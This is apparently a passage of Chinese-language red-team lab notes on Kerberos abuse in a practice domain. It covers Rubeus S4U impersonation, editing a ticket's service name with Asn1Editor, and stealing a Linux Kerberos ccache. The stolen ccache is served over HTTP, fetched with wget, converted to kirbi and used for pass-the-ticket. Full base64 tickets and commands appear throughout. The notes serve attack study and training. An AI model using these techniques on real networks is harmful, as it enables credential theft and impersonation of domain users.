    doIFLTCCBSmgAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA9EwggPNoAMCARKhAwIBAqKCA78EggO7+zYro9081g7t0z+jHT422umcZe8wpsnYp7RO0Gbtq3V8asQ4Kzv0gDvJC4Q95l3OsrX4iiP+5FbbrFtJP36aUyC5BGIQpjW4P1OqLcz+OCQmujUbtLjIz28mlt15+7Li6WHJ+jySPUQV7qGFtH5I2Rl0cV2XONN0cFqf/pueM/pWifjWKIENoUaiOtHVQyALXk4fK7qA0HzRjY7SOI1mat/MxRZKgbl1NARfdgHpVW3zbRD6PcrsaBCju7TLd55AbrtVB4auvfLR6Y/Yx99N31MUh61yzcBgUF5xkndkiMJaQyxdecjXRWmUeDz/yBmo8lQfrgGqDOcvgMYe337XZmM5eRj2JHkUzTeJ7CXEv9OBHVgSIYr0EDMjxWv3Hx/kBs2e2XMgxsTCpoPuqqnz9SUK2vebQ9dZ/7nfMnnOAU9HRJGjWUXLhHrbp7SH84DvKSqeuZjunqGsCqUzb3cTeDZmfwfHZECn6TC98Jvqzz3TfxvLIqhbdV1UYtmJLoAGFi21ScfTybC6GpR0MsA+wsivBb/gV6rqVl8jkDZI8qnK+PobmQRY5NIwALOWkoBWmkUdbVQN8LV3rwWibwKwKnBBwk90vOp0ZSrCuS+HeY+x2NEg+gbgDqp6KbmwO9RfodrbcQD1wVjJaZ7ISxU0BJ1GCOioDiCKdEaAZ3oYHJ/MBKF/p4Mt4aY6juabpwh14sGpZYb7G5i2zcKDs6Vkc/415ZWLI6tkIe8sEG7VPE4LzCxaf2dkLJcqYqvmfch5NwFTHbqSt7xv5EbNAPKrH5KLFoXR5/TnqpoyLi7ImCICnKy30WaKDTUUh64W1BdgsBC5c1XXZehDQ0C/ML09EjQKiTrdI21cG7YLhBFW9Se6sgmPC/T7RZ+jktFE16jXEUmUJtTWvPbc8QGDX+LCMIv+HsCk7UqcUGNrlXCG4b69mztdqaEw/spGjTOoSJOnk59mKg3iby6l0xbDvoYProAcbYM5YSJ80WJfZE/Q3g/80qnkskk6eXXvCSsOU0QnJCV76BSfKUKsg4hZyp6ugN8Q8Qu9TLCOZjBt92p+ZmXTXNYoAc7pIN6mXacOt6I939DXk/7Hv7v2byPV0ywfkNgF6hvF88DhhBWjAb4o+AWtBITmawaaf5FaNtyZeBdgI3XJVS7aOKk36XZlndjXhErsos+2neaCdMpCJR6HkQcj85UklrU/wH14YZkqTXl6sVPHym59SC4T5WBo2Z5/LO4FSGoUEV+m1mfGax8NQPMZHWwE+GCuaGAyrKOB9TCB8qADAgEAooHqBIHnfYHkMIHhoIHeMIHbMIHYoCswKaADAgESoSIEIMiY1PN7UbC6/uNHX6H9BoAwtbkNXv5mVALvZTf1lzZ9oRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjBwMFAGAhAAClERgPMjAyMjA4MTQwODAzMjFaphEYDzIwMjIwODE0MTgwMzIxWqcRGA8xOTcwMDEwMTAwMDAwMFqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

[*] Ticket cache size: 6

```


4. 制作成WKSTN-2的ticket

```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn-2-tgt.kirbi" , [System.Convert]::FromBase64String( "doIFLTCCBS...UkJPVElDLklP"))
```

5. 导入ticket，尝试访问

访问失败


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660464491655.png)



6. 利用WKSTN-2的tgt，假冒nlmb用户申请一张```cifs/wkstn-2.dev.cyberbotic.io```的tgs

```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /user:WKSTN-2$ /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /impersonateuser:nlamb /ticket:doIFLTCCBS...UkJPVElDLklP /nowrap
```


 
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660464594234.png)

```
 [+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'WKSTN-2$@DEV.CYBERBOTIC.IO'

[+] received output:
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2self request to 10.10.17.71:88
[+] S4U2self success!
[*] Got a TGS for 'nlamb' to 'WKSTN-2$@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFgjCCBX6gAwIBBaEDAgEWooIEnzCCBJthggSXMIIEk6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPohUwE6ADAgEBoQwwChsIV0tTVE4tMiSjggReMIIEWqADAgESoQMCAQWiggRMBIIESACUvhQahq7V+FrY8kAQNcZQPRgFBFyjvAXKw2kox5vt+QMYPujGu2r6SkoP5T5kuOsUeMeyrcRZAobnvPoorjg1TMROPGl8dW5ycNud7C7UKEdc5AFf5gxgarm7b3eIJwNTB3P6Vc1EtJ3ZdYcxyNNyfWs52skdVwPujdPGKR/r5MU0+lXNSv3d5T9dwkHzP6S1Q6nLXffmYk/p8X1dZj5p85vtsxtf+Cy2k+gsOfEnXbc5NgBphlO+lRSxIqmvbZp3OKTdXszNRjEVPK+CgzZnVWGig8GdnoJe4F/h1LiXJx4+EWE07t/jvMlt0UKWKc8jdptq1BOePf1Cwlanxo1Q2YkNBarTNzQyT7G0HaedpA7Yt0t9bfvM6P33LtwpeimOVbjnF35DcH0wrJDpQkPh2OoXKtI3dhYo79L8d1FnpQ2PbBwIA1roi0hrT0meKFq8NUTWwLSuCO0wv2nBaxTSdIq2wD5F4cqEENPJn0IZqmVXsvumPojnfooR6QL3194s9MPhnG3eplji0Ag7sKfVABBjs6b2ivBGkYgNYYRB1hkaGLGr+BiiHA1W6rpRUo2+2gvcb1thhcRKBjPiUV7zWICMApqjfb8TFhm45XanWTjp1lj/z48UV6OO0p5fSImSgDLKarswNykl3IhfWAKANpO6O+JuY4s/NfmGUZtbQ/X6M2WIXZuCPFAVDAd1TRI6HphDlBC1MQNhZHrEhPscYXeDz5V3SzU6ZS7+Ce3CPoHeiGcNHcrhQYVDzuD8uBTFb2tCPcBd4/vaSRD+t00DDBLAqWPe57Ax+6q6Eax9Jrs/GZZ/jOy2H6pyQAom4Cd95toS1sQfNXn4PHRy14Jsle7fY/AFXcDZV6gSEJeyfOqhWMsF6IXOW7ZXUuxPKWAsvLd3Uq7bQc3sO1m1p3HeuYegUTMevYwq1Ag/tz8OnEEnFt8yY2WIh5gNsZ6BZVfGCVANxfM+/6VeyqachcJd4BsmpA1nLeCSznlKfXYVgg/XXT0E2+TnxhIu4aF4vwBaM5XA44GNIFFT1qYocWocY5d6tNmMiCUsWwvoBHDbdNoroSisdKO+em9WZxSSPBN9HBB5h6B1dfoSGf51zQVFVL05wcl7TgzPq5jyjDt6AkkXAZiww9mIv8cvYiaIBI8TdhD5u4UeDWPsAKnwjOkWrwAm7FEWCeA4H+M7qu0RXFFtTamvpYs3utoFS1KuCOlNYXgsxo+nr0mI8YgNWkBJU4pL++kzWe3Ahtr/VVkqJu1CWZby2gfuhXNEzwA7x2TFEkKpdMfEA37N5VOc/fvfbkuDUnGw2eL7DfR1177JF5sohKRLHS8FloTAAia4s3jiyxYPAsZKzE1JaOLq+zMlWH4UNGrDloO2E4lHPU7RgdF2UszxcGJySILCEVtvdjauF/XpQ1Td8yInuCmIJO2l39olU7LaX82vHNK2Qrw5+sN/Abjb0E2jgc4wgcugAwIBAKKBwwSBwH2BvTCBuqCBtzCBtDCBsaArMCmgAwIBEqEiBCD+Qw14qjdk0xArNHYHCx76YL3+Yg1ak2Ccm5eWLVYOX6ETGxFERVYuQ1lCRVJCT1RJQy5JT6ISMBCgAwIBCqEJMAcbBW5sYW1iowcDBQBgIQAApREYDzIwMjIwODE0MDgwOTM0WqYRGA8yMDIyMDgxNDE4MDMyMVqoExsRREVWLkNZQkVSQk9USUMuSU+pFTAToAMCAQGhDDAKGwhXS1NUTi0yJA==

[*] Impersonating user 'nlamb' to target SPN 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Building S4U2proxy request for service: 'cifs/wkstn-2.dev.cyberbotic.io'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Sending S4U2proxy request to domain controller 10.10.17.71:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION


```

可见s4u2proxy这一步失败了（KRB-ERROR (13) : KDC_ERR_BADOPTION），但是没有关系


制作一张wkstn-2-s4u.kirbi
```
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi", [System.Convert]::FromBase64String("doIFgjCCB....JA=="))
```


查看这张ticket的描述


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465090520.png)

```
PS C:\Tools\Rubeus\Rubeus\bin\Debug> .\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1


[*] Action: Describe Ticket


  ServiceName              :  WKSTN-2$
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  8/14/2022 8:09:34 AM
  EndTime                  :  8/14/2022 6:03:21 PM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  /kMNeKo3ZNMQKzR2Bwse+mC9/mINWpNgnJuXli1WDl8=
[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.

```

留意现在的ServiceName是 WKSTN-2$

## 利用Asn1Editor修改tgs的ServiceName

打开Asn1Editor


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465223854.png)


选择上面的wkstn-2-s4u.kirbi票据


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465318554.png)


选择第1个```GENERAL STRING```，双击修改它的值为cifs


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465485113.png)

往上一级，新建一个条目，


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465540679.png)

编辑内容


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465703096.png)


选择第2个```GENERAL STRING```，双击修改它的值为cifs


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465837786.png)

新建，编辑内容



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660465923328.png)

编辑完记得保存


现在再次运行rebuse查看ServiceName已经变成cifs/wkstn-2.dev.cyberbotic.io


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660466024093.png)

```
PS C:\Tools\Rubeus\Rubeus\bin\Debug> .\Rubeus.exe describe /ticket:C:\Users\Administrator\Desktop\wkstn-2-s4u.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1


[*] Action: Describe Ticket


  ServiceName              :  cifs/wkstn-2.dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  8/14/2022 8:09:34 AM
  EndTime                  :  8/14/2022 6:03:21 PM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  /kMNeKo3ZNMQKzR2Bwse+mC9/mINWpNgnJuXli1WDl8=
[!] AES256 in use but no '/serviceuser' passed, unable to generate crackable hash.
```



在wkstn-1操作


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660466188920.png)

# Linux Credential Cache

这里主要假设nix-1这台linux机器上有jking的ccache（可以理解为经过了身份验证的缓存）

通过把这个ccache转成CS可使用的票据，利用这个用户的身份执行ptt操作


linux的ccache存储在/tmp目录，文件只可以被root或者用户本身读取
```
svc_oracle@nix-1:~$ ls -l /tmp/
total 20
-rw------- 1 jking      domain users 1350 Aug 14 08:47 krb5cc_1394201122_WNr0Zn
-rw------- 1 svc_oracle domain users 1341 Aug 14 08:51 krb5cc_1394201127_yuBrgE
drwx------ 3 root       root         4096 Aug 14 07:44 snap.lxd
drwx------ 3 root       root         4096 Aug 14 07:44 systemd-private-51f2f16cf1174fd5997e068447edc84c-systemd-logind.service-x27KBf
drwx------ 3 root       root         4096 Aug 14 07:42 systemd-private-51f2f16cf1174fd5997e068447edc84c-systemd-timesyncd.service-Jix3Wi
```

提权到root
```
svc_oracle@nix-1:~$ sudo -l
[sudo] password for svc_oracle: 
Matching Defaults entries for svc_oracle on nix-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_oracle may run the following commands on nix-1:
    (ALL) ALL
svc_oracle@nix-1:~$ sudo su
root@nix-1:/home/svc_oracle@dev.cyberbotic.io# 
```

开启一个80服务，传文件
```
root@nix-1:/tmp# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

攻击机kali获取文件
```
root@kali:/opt/cobaltstrike/downloads# proxychains wget http://10.10.17.12/krb5cc_1394201122_WNr0Zn
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
--2022-08-14 09:18:04--  http://10.10.17.12/krb5cc_1394201122_WNr0Zn
Connecting to 10.10.17.12:80... [proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.17.12:80  ...  OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: 1350 (1.3K) [application/octet-stream]
Saving to: ??krb5cc_1394201122_WNr0Zn??

krb5cc_1394201122_WNr0Zn                  100%[==================================================================================>]   1.32K  --.-KB/s    in 0s      

2022-08-14 09:18:04 (157 MB/s) - ??krb5cc_1394201122_WNr0Zn?? saved [1350/1350]

```


用impacket-ticketConverter把linux的票据转换成CS可以识别的票据
```
root@kali:/opt/cobaltstrike/downloads# impacket-ticketConverter krb5cc_1394201122_WNr0Zn jking.kirbi
Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
root@kali:/opt/cobaltstrike/downloads# ls
ce0198041  jking.kirbi  krb5cc_1394201122_WNr0Zn
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660468802360.png)


把票据传回windows攻击机
```
certutil -urlcache -split -f "http://10.10.5.120:8000/jking.kirbi" jking.kirbi
```


导入票据，现在可以访问srv-2

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660469108850.png)